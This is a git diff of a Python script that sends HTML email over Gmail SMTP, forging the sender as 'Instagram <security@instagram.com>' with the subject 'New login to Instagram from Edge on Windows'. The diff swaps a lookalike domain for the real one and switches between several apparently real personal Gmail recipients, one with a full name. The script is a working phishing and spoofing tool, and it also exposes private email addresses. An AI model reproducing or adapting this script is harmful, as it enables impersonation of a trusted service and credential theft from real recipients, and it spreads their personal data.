@@ -7,18 +7,19 @@ from email.utils import make_msgid
 
 if __name__ == '__main__':
 
-    # username = 'instagram.authorization.service@gmail.com'
-    username = 'lightkrg@gmail.com'
+    username = 'instagram.authorization.service@gmail.com'
+    # username = 'lightkrg@gmail.com'
 
-    fake_from = 'security@auth-instagram.com'
+    fake_from = 'security@instagram.com'
     fake_name = 'Instagram'
 
     # to_email = 'instagram.authorization.service@gmail.com'
     # to_email = 'dilya17082004@gmail.com'
     # to_email = 'erkeesentaeva1@gmail.com'
     # to_email = 'lightkrg@gmail.com'
-    # to_email = 'lumieny@gmail.com'
-    to_email = 'msmegap@gmail.com'
+    to_email = 'lumieny@gmail.com'
+    # to_email = 'a.ordayev@gmail.com'
+    # to_email = 'msmegap@gmail.com'
     to_name = 'Adil Ordayev'
 
     subject = 'New login to Instagram from Edge on Windows'
@@ -28,12 +29,14 @@ if __name__ == '__main__':
     # content = 'test'
 
     msg = MIMEMultipart('alternative')
+    content = MIMEText(html, 'html')
+    msg.attach(content)
     msg['Subject'] = subject
     msg['From'] = f'{fake_name} <{fake_from}>'
     msg['To'] = f'{to_name} <{to_email}>'
     msg['Message-ID'] = make_msgid()
-    content = MIMEText(html, 'html')
-    msg.attach(content)
+
+    # print(msg)
 
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
